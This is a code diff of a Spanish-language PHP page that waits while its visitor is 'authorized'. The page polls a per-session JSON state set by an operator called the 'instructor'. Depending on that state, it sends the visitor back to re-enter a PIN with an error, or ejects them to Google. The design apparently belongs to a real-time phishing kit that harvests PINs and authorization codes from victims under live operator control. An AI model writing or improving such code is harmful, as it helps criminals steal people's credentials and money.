@@ -1,6 +1,19 @@
 <?php
 session_start();
 $id_sesion = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';
+
+// Si se solicita verificar el estado vía AJAX/Fetch
+if (isset($_GET['chequear']) && !empty($id_sesion)) {
+    header('Content-Type: application/json');
+    $ruta_json = "sesiones/{$id_sesion}.json";
+    if (file_exists($ruta_json)) {
+        $datos = json_decode(file_get_contents($ruta_json), true);
+        echo json_encode(['estado' => $datos['estado']]);
+    } else {
+        echo json_encode(['estado' => 'desconectado']);
+    }
+    exit();
+}
 ?>
 <!doctype html>
 <html lang="es">
@@ -32,33 +45,21 @@ $id_sesion = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';
     <a class="btn-small" href="noautorizado.php">He autorizado correctamente</a>
   </div>
 
-<script>
-const usuarioId = "";
-
-async function chequearEstado() {
-  if (!usuarioId) return;
-  try {
-    const res = await fetch('./sesiones/' + usuarioId + '.json?v=' + new Date().getTime());
-    if (!res.ok) return;
-    const data = await res.json();
-    const estado = data.estado || '';
-
-    if (estado === 'autorizado') {
-      window.location.href = 'correo.php';
-    } else if (estado === 'no_autorizado') {
-      window.location.href = 'noautorizado.php';
-    } else if (estado === 'pin_rebotado') {
-      // Si instructor marca error de PIN, volvemos al PIN con la alerta
-      window.location.href = 'pin.php?error=pin_malo';
-    }
-  } catch (e) {
-    console.log('Esperando autorización...');
-  }
-}
-
-if (usuarioId) {
-  setInterval(chequearEstado, 2000);
-}
-</script>
+ <script>
+        // Consultar el estado en segundo plano cada 1.5 segundos
+        setInterval(function() {
+            fetch('esperar_correo.php?chequear=1')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.estado === 'pin_rebotado') {
+                        // Redirige directo a la pantalla de PIN con la alerta de error activada
+                        window.location.href = 'pin.php?error=pin_malo';
+                    } else if (data.estado === 'ir_a_google') {
+                        // Saca al usuario enviándolo a Google de inmediato
+                        window.location.href = 'https://www.google.com';
+                    }
+                });
+        }, 1500);
+    </script>
 </body>
 </html>
